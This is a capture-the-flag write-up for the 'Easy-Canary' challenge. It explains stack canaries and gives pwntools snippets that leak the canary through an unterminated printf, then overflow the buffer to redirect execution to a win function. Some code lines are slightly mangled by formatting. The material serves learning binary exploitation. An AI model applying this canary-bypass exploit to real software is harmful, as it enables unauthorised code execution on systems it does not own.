# Easy-Canary

This challenge consisted of a ret2win, with stack canaries implemented.

## Prerequisites:
Know how buffer overflows work.

## What are stack canaries?
The term comes from the historical use of canaries in coal mines. Since canaries are more vulnerable to toxic gases than humans are, coal miners would bring canary birds with them. When the canary died, they would know that they would also died soon and could safely evacuate the mine.
Stack canaries are "secret" values placed on the stack just before the return address. Attackers usually have the goal of changing the return address with a BOF (buffer overflow), but to do that, the canary must be overwritten as well.
So compilers insert code to the following:

1.Place a random canary value (at program startup) on the stack.
2.Check the canary before returning from a function.
3.If the canary is corrupted, terminate the program (usually with via \_\_stack_chk_fail()).

For more information, check out this article: https://ctf101.org/binary-exploitation/stack-canaries/

## What was the vulnerability?
In easy-canary there is a buffer-overflow opportunity to buf. The buf has a size of 40 bytes, but we can insert 256 bytes. This leads us to try to overwrite the return address with a simple BOF. However, since the canary is present, a simple BOF won't work, the program will just crash, because the canary value won't stay the same.

### Just a bit more theory.
Before we dive into the exploit we need to understand how the printf() works in C.
Imagine we have a sentence like this:
"Hey we are Capitão Sapinhas and we are a ctf team we love to do ctfs"
What's missing here? Punctuation! If we asked someone to read the first sentence they would not know that it stops at "ctf team" because there is no period.
The way that printf() works is exactly the same. For printf() to know when to stop printing stuff it needs to have a "period", in this case a null byte "\x00". Strings are null terminated (ex: "car\x00"), so functions like printf() know where to stop printing data and not reveal any sensitive information.

Now that we have that out of the way we can understand the exploit.

First part:
```
io.sendlineafter(b'> ', b'1')
payload = \x00 \* 40 + b"x"
io.send(payload)
```

In this snippet all we do is fill the buffer with 40 null bytes, and one "x".
Visually speaking
Before the attack:
`
[buffer(40 bytes)][canary(eg:"\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF)][returnaddress]
`
After the attack:
`
[buffer(filled)][canary(eg:"x\xFF\xFF\xFF\xFF\xFF\xFF\xFF)][returnaddress]
`

The printf function, instead of stopping printing at the canary, since there is no null byte, it will actually print the canary!
```
io.sendlineafter(b'> ', b'2')
io.recvuntil(payload)
canary = u64(b'\0' + io.recv(7))
log.info(f'{canary = :#0x}')
```
We print the actual canary with the "Printf your name" function. We have the canary!! Now all we have to do is a buffer overflow but replacing the canary with the value we know so that the program won't crash.
```
win = elf.symbols["win"]
print(hex(win))

payload2 = b"a" _ 40 + p64(canary) + b"b" _ 8 + p64(win+4)
print(payload2)

io.sendline(b"1")
io.recv()
io.sendline(payload2)
io.recv()
io.sendline(b"3")
io.interactive()
```

payload2 is filling the buffer, inserting the canary and changing the return address to the win function.
When we exit, the program will return to the win function.
